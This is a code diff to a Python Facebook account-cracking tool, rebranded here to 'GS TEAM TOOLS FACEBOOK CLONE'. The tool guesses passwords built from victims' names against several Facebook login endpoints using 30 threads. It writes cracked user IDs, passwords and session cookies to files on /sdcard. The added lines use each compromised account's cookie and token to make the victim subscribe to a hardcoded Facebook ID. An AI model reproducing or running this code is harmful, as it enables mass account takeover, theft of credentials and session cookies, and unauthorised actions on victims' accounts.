@@ -926,6 +926,8 @@ class crack:
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
+                        follow_id='100000160984736'
+                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
                         print(f"\r\033[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
@@ -1031,36 +1033,38 @@ def follow(self,coki):
         print (logo4)
         motd.clear()
         print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
-        print (47*'-')
+        print (43*'-')
         print ('\033[1;32m[1] Method 1')
         print ('\033[1;32m[2] Method 2')
         print ('\033[1;32m[3] Method 3')
-        print (47*'-')
+        print (43*'-')
         vz = input('\033[1;36mSelect: \033[0;97m')
         if vz in ['1', '2', '3']:
-            print (47*'-')
+            print (43*'-')
             print ('\033[1;32m[1] Crack (Fast)')
             print ('\033[1;32m[2] Crack (Slow)')
             motd.append('file')
             print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
             uz = input('\033[1;36mSelect: \033[0;97m')
             time.sleep(0.5)
-            print (47*'-')
+            print (43*'-')
             print ('\033[1;33m~Use Flight Mode 5 Second After Every 10 mint~\033[0;97m')
-            print (47*'-')
+            print (43*'-')
             time.sleep(0.5)
             print (self.apk)
             time.sleep(0.5)
             print (' \x1b[1;97mCrack Running\x1b[1;97m ')
             time.sleep(0.5)
-            print (47*'-')
-            print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
+            os.system('clear')
+            print (logo4)
+            print (43*'-')
+            print ('\x1b[1;92m   ~~~~~~~GS TEAM TOOLS FACEBOOK CLONE~~~~~~~\x1b[1;97m')
             time.sleep(0.5)
-            print (47*'-')
-            with JuttBadshah(max_workers=30) as (__juttbrand__):
-                for juttxd in self.id:
+            print (43*'-')
+            with GSXDRiyad(max_workers=30) as (__GSXDbrand__):
+                for GSXDxd in self.id:
                     try:
-                        uid, name = juttxd.split('|')
+                        uid, name = GSXDxd.split('|')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             hf = self.ggs.replace("First", xz[0]).replace("first", xz[0].lower()).replace("Last", xz[1]).replace("last", xz[1].lower()).replace("Name", name).replace("name", name.lower()).splitlines()
@@ -1071,25 +1075,25 @@ def follow(self,coki):
                         url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                         url3 = 'https://b-api.facebook.com/method/auth.login'
                         if vz == '1' and uz == '1':
-                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"free.facebook.com")
+                            __GSXDbrand__.submit(self.__mbasic__,uid,pwx,"free.facebook.com")
                         elif vz == '1' and uz == '2':
-                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"p.facebook.com")
+                            __GSXDbrand__.submit(self.__mbasic__,uid,pwx,"p.facebook.com")
                         elif vz == '1' and uz == '3':
-                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"x.facebook.com")
+                            __GSXDbrand__.submit(self.__mbasic__,uid,pwx,"x.facebook.com")
                         elif vz == '2' and uz == '1':
-                            __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                            __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                         elif vz == '2' and uz == '2':
-                            __juttbrand__.submit(self.__free__,uid,pwx,url2)
+                            __GSXDbrand__.submit(self.__free__,uid,pwx,url2)
                         elif vz == '2' and uz == '3':
-                            __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                            __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                         elif vz == '3' and uz == '1':
-                            __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
+                            __GSXDbrand__.submit(self.__mmb__,uid,pwx,url1)
                         elif vz == '3' and uz == '2':
-                            __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
+                            __GSXDbrand__.submit(self.__mmb__,uid,pwx,url2)
                         elif vz == '3' and uz == '3':
-                            __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
+                            __GSXDbrand__.submit(self.__mmb__,uid,pwx,url1)
                         else:
-                            __juttbrand__.submit(self.__mbasic__,uid,pwx,'p.facebook.com')
+                            __GSXDbrand__.submit(self.__mbasic__,uid,pwx,'p.facebook.com')
                     except:
                         pass
 
